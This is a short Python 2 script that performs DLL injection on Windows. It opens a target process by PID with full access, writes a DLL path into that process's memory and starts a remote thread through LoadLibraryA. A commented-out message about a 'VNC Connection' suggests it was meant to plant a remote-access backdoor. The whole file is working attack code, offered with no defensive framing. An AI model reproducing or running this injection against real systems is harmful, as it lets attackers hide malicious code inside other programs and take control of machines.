import sys
from ctypes import *
from winappdbg import win32

PAGE_READWRITE     =     0x04
PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32
pid      = sys.argv[1]
dll_path = sys.argv[2] + '\x00'
dll_len  = len(dll_path)

# Get a handle to the process we are injecting into.
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)


#allocate some space for the dll path
arg_address = win32.VirtualAllocEx(h_process, dwSize=dll_len)
#arg_address = kernel32.VirtualAllocEx( h_process, none, dll_len + 1, virtual_mem, page_readwrite)

print "[*] alloc address: 0x%08x" % arg_address

# write the dll path into the allocated space
written = c_int(0)
#if not kernel32.writeprocessmemory(h_process, arg_address, dll_path, dll_len, byref(written)):
#    raise winerror()

win32.WriteProcessMemory(h_process, arg_address, dll_path)

# We need to resolve the address for LoadLibraryA
kernel32.GetModuleHandleA.argtypes = [win32.LPSTR]
kernel32.GetModuleHandleA.restype  = win32.HMODULE
h_kernel32 = kernel32.GetModuleHandleA("kernel32")

if not h_kernel32:
    raise WinError()
    
print "[*] Kernel32 Address: 0x%08x" % h_kernel32

kernel32.GetProcAddress
kernel32.GetProcAddress.argtypes = [win32.HMODULE, win32.LPVOID]
kernel32.GetProcAddress.restype  = win32.LPVOID
h_loadlib  = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

if not h_loadlib:
    raise WinError()

print "[*] LoadLibrary Address: 0x%08x" % h_loadlib

# #h_kernel32 = win32.GetModuleHandle("kernel32.dll")
# #h_loadlib = win32.GetProcAddress(h_kernel32, "LoadLibrary")

# # Now we try to create the remote thread, with the entry point set
# # to LoadLibraryA and a pointer to the DLL path as it's single parameter
thread_id = c_int(0)

kernel32.CreateRemoteThread.argtypes = [win32.HANDLE, win32.LPSECURITY_ATTRIBUTES, win32.SIZE_T, win32.LPVOID, win32.LPVOID, win32.DWORD, win32.LPDWORD]
kernel32.CreateRemoteThread.restype  = win32.HANDLE

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, None):
    raise WinError()

print "[+] done!"
    
# thread = win32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0)

# print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
# print "[*] VNC Connection now open and ready for action...."
